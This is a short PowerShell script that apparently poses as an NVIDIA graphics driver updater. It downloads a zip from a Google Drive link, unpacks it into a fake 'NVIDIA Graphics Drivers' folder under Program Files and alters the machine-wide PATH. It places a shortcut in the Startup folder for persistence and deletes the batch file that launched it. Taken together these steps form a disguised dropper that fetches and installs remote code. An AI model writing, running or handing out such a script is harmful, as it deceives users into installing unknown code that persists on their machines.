$username=[Environment]::UserName
$zipFile = "https://drive.usercontent.google.com/download?id=1u1qFFtkGuaxJeJbpG2z6GiLWWG-22Yvl&export=download&authuser=0&confirm=t&uuid=3646b9a2-5ad2-4e45-a5f2-40c29cf5e81d&at=APZUnTV3QXBrXAmncprmw8d2WtJL:1722356348944"
$op = "C:\Users\$username\AppData\Local\Temp\updater.zip"
$cmd1 = "curl `"$zipFile`" --output `"$op`""
cmd /c $cmd1
Expand-Archive "C:\Users\$username\AppData\Local\Temp\updater.zip" -DestinationPath "C:\Program Files\NVIDIA Graphics Drivers"
$Path = [Environment]::GetEnvironmentVariable("PATH", "Machine")+';C:\Program Files\NVIDIA Graphics Drivers\bin;C:\Program Files\NVIDIA Graphics Drivers\include'
[Environment]::SetEnvironmentVariable( "Path", $Path, "Machine" )
cp "C:\Program Files\NVIDIA Graphics Drivers\Nvidia Driver.lnk" "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
del C:\Users\$username\Downloads\first.bat
